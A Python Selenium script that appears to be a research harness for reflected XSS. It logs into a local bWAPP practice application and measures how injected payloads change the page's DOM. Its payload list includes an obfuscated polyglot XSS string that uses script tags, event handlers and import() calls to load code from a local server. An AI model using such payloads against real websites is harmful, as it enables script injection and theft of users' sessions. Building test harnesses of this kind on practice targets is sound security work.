import uuid
from typing import Callable

from bs4 import BeautifulSoup
from deepdiff import DeepDiff
from selenium import webdriver
from selenium.webdriver.common.by import By

URL = "http://127.0.0.1:4040/bWAPP/"

def xss_reflected_get_firstname(driver: webdriver, payload: str) -> str:
    path = "xss_get.php"
    driver.get(URL + path)
    driver.find_element(By.ID, "firstname").send_keys(payload)
    driver.find_element(By.ID, "lastname").send_keys("test")
    driver.find_element(By.NAME, 'form').click()
    html = driver.page_source
    return html

def login(driver):
    path = "login.php"
    driver.get(URL + path)
    driver.find_element(By.NAME, "login").send_keys("bee")
    driver.find_element(By.NAME, "password").send_keys("bug")
    driver.find_element(By.NAME, 'form').click()

def print_diff(diff: DeepDiff):
    print(diff.keys())
    if 'iterable_item_removed' in diff:
        print("---- ITEMS REMOVE EXPECTED ----")
        print(diff['iterable_item_removed'].keys())
    if 'iterable_item_added' in diff:
        print("---- ITEMS ADD EXPECTED ----")
        print(diff['iterable_item_added'].keys())
    if 'values_changed' in diff:
        print("---- ITEMS CHANGE EXPECTED ----")
        print(diff['values_changed'].keys())

'''
:return result: a dict of sets with positions, where a diff appeared either in @diff_payload or @diff_expected; empty if both are equal
'''
def compare_diffs(diff_payload: DeepDiff, diff_expected: DeepDiff):
    result = dict()
    for key in ['iterable_item_removed', 'iterable_item_added', 'values_changed']:
        if key in diff_payload:
            if key in diff_expected:
                set_expected = set(diff_expected[key].keys())
                set_actual = set(diff_payload[key].keys())
                result[key] = set_expected ^ set_actual
            else:
                result[key] = set(diff_payload[key].keys())
        elif key in diff_expected:
            result[key] = set(diff_expected[key].keys())
    return result

def single_experiment(driver: webdriver, payloads: list[str], experiment_function: Callable[[webdriver, str], str]) -> any:
    # set login cookie for driver
    login(driver)

    # test which differences appear when the payload changes between "normal" strings
    uuid_1 = str(uuid.uuid4())
    uuid_2 = str(uuid.uuid4())
    while uuid_1 == uuid_2: uuid_1 = str(uuid.uuid4())
    html_uuid_1 = experiment_function(driver, uuid_1)
    html_uuid_2 = experiment_function(driver, uuid_2)
    soup_uuid_1 = BeautifulSoup(html_uuid_1, "html.parser")
    soup_uuid_2 = BeautifulSoup(html_uuid_2, "html.parser")

    expected_diff = DeepDiff(soup_uuid_1, soup_uuid_2)
    print_diff(expected_diff)
    results = {}

    # generate diffs for each payload and compare to the expected diff, save differences
    for payload in payloads:
        html_payload = experiment_function(driver, payload)
        soup_payload = BeautifulSoup(html_payload, "html.parser")
        diff_payload = DeepDiff(soup_uuid_1, soup_payload)
        results[payload] = compare_diffs(diff_payload, expected_diff)
        print(results[payload])

    driver.quit()

payloads = ["\"<ScRiPt sRc=`http://localhost:9090`></ScRiPt>nOeMbed><ScRiPt sRc='http://localhost:9090'></ScRiPt>\"&gt;import(`http://localhost:9090`) <!--hTmL>' oNLoAd= )texTarEa&gt;<iMg-<ScRiPt sRc=`http://localhost:9090`></ScRiPt> oNFoCus=*/';/ifRaMe>hTmL> oNtOgGle=/*`>/sOurCe&gt; oNmOuSeLeaVe= > OnBlUr= <ScRiPt sRc='http://localhost:9090'></ScRiPt>iMg/* onClICk=import(\"http://localhost:9090\")", "sane"]

if __name__ == '__main__':
    driver = webdriver.Chrome()
    single_experiment(driver, payloads, xss_reflected_get_firstname)
